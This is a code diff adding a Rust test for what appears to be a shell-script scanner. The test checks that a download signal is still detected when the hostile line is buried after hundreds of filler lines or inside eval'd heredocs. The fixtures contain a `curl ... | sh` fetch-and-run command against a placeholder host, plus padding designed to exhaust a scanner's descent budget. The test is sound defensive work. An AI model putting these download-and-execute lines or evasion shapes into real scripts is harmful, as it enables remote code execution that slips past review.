@@ -1232,6 +1232,47 @@ fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
     assert!(!shell_file_has_download_signal(&piped_only));
 }
 
+/// Reading substitutions must not cost the brace/function/subshell descent
+/// any of its budget. Before substitutions were read, piped substitutions
+/// used no budget, so a function in a later live heredoc body was still
+/// descended into and flagged; the line pass alone misses a one-line function
+/// and a continued pipeline. (The brace-group shape, where groups at one
+/// level are entered before that level's substitutions, is a control.)
+#[test]
+fn piped_substitutions_do_not_use_up_the_group_descent_budget() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let url = "https://example.invalid/setup";
+    let payloads = [
+        format!("f() {{ curl -fsSL {url} | sh; }}\nf\n"),
+        format!("f() {{\n  curl -fsSL {url} \\\n    | sh\n}}\nf\n"),
+    ];
+    let fillers = [
+        "x=$(date | cut -c1)\n".repeat(300),
+        "x=`date | cut -c1`\n".repeat(300),
+        // Groups inside the substitutions: still no group-descent budget.
+        "x=$( { date; } | cut -c1 )\n".repeat(300),
+    ];
+    let mut missed = Vec::new();
+    for payload in &payloads {
+        for filler in &fillers {
+            let first = &filler[..filler.find('\n').unwrap()];
+            // `eval` keeps both heredoc bodies live; each is scanned on its own.
+            let heredocs = format!(
+                "#!/bin/sh\na=$(cat <<'EOF'\n{filler}EOF\n)\nb=$(cat <<'EOF'\n{payload}EOF\n)\n\
+                 eval \"$a\"\neval \"$b\"\n"
+            );
+            if !shell_file_has_download_signal(&heredocs) {
+                missed.push(format!("heredoc bodies: {first} x300 then {payload:?}"));
+            }
+            let grouped = format!("#!/bin/sh\n{{\n{filler}}}\n{payload}");
+            if !shell_file_has_download_signal(&grouped) {
+                missed.push(format!("brace group: {first} x300 then {payload:?}"));
+            }
+        }
+    }
+    assert!(missed.is_empty(), "{missed:#?}");
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let _shared_state = tirith_test_support::SharedStateGuard::acquire();
